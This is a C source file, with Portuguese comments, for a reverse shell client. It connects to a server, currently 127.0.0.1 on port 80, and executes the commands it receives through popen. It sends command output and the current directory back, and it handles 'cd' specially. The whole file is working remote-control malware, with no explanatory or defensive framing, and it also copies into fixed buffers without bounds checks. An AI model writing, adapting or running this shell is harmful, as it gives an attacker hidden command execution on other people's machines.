#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define PORT (80)
#define BUFFER_SIZE (1024)
#define SEPARATOR ("<SePaRaToR>")

int main()
{
    int client_fd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    char cwd[BUFFER_SIZE];
    FILE* fp;

    client_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (client_fd < 0)
    {
        perror("Falha na configuração do socket\n");
        return -1;
    }

    // Configura o endereço e a porta do servidor
    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);
    server_addr.sin_port = htons(PORT);

    // Conecta ao servidor
    if (connect(client_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("Falha na conexão\n");
        return -1;
    }

    // Envia o diretório de trabalho atual
    getcwd(cwd, BUFFER_SIZE);
    if (send(client_fd, cwd, BUFFER_SIZE, 0) < 0)
    {
        perror("Falha ao enviar diretório de trabalho atual");
        return -1;
    }

    while (1)
    {
        memset(buffer, 0, BUFFER_SIZE);
        if (recv(client_fd, buffer, BUFFER_SIZE, 0) < 0)
        {
            perror("Falha ao receber dados\n");
            return -1;
        }

        if (strncmp(buffer, "cd", 2) == 0)
        {
            strcpy(cwd, &buffer[3]);
            cwd[strlen(&buffer[2])] = '\0';

            if (chdir(cwd))
            {
                perror("Falha ao alterar o diretório");
                char chdir_fail_mesg[] = "Falha ao alterar o diretório\n";
                strcpy(buffer, chdir_fail_mesg);
                buffer[strlen(chdir_fail_mesg)] = '\0';
            }

            getcwd(cwd, BUFFER_SIZE);

            strcat(buffer, "\n");
            strcat(buffer, SEPARATOR);
            strcat(buffer, cwd);

            if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0)
            {
                perror("Falha ao enviar dados");
                return -1;
            }
        }
        else
        {
            if (chdir(cwd))
            {
                perror("Falha ao alterar o diretório");
                return -1;
            }
            fp = popen(buffer, "r");
            memset(buffer, 0, BUFFER_SIZE);
            if (!fp)
            {
                perror("Falha ao executar comando");
            }

            while (1)
            {
                char line[BUFFER_SIZE];
                int status = fscanf(fp, "%[^\n]%*c", line);
                if (status != 1)
                {
                    break;
                }
                strcat(buffer, line);
                strcat(buffer, "\n");
            }

            strcat(buffer, SEPARATOR);
            strcat(buffer, cwd);

            printf("%s\n", buffer);
            if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0)
            {
                perror("Falha ao enviar dados");
                return -1;
            }
            pclose(fp);
        }
    }

    return 0;
}
